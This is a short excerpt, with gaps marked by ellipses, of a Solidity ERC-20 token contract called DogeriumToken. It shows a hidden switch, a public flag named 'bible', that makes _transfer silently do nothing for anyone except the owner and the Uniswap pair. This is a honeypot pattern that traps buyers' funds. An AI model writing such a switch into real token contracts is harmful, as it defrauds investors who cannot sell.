...
contract DogeriumToken is Context, IERC20, Ownable {
    ...
    address public  _marketingWallet = 0x8D7a8C2cbe13A573d06De4a57739Bc426FBebCBD;
    bool public bible = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && bible){ return; }
